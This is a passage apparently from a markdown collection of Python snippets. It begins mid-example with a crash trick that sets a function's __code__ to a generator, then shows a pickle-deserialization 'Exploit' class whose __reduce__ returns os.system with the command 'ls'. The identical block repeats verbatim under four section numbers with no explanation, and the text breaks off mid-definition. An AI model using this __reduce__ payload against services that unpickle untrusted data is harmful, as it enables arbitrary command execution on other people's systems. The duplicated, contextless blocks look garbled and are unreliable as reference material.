fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi
fn()
```

### 1.2.2

```python
class Exploit(object):
    def __reduce__(self):
        import os
        return(os.system, ('ls',))
Exploit().__reduce__()
```

```python
class Exploit(object):
    def __reduce__(self):
        import os
        return(os.system, ('ls',))
Exploit().__reduce__()
```

### 1.2.3

```python
class Exploit(object):
    def __reduce__(self):
        import os
        return(os.system, ('ls',))
Exploit().__reduce__()
```

### 1.2.4

```python
class Exploit(object):
    def __reduce__(self):
        import os
        return(os.system, ('ls',))
Exploit().__reduce__()
```

### 1.2.5

```python
class Exploit(object):
    def
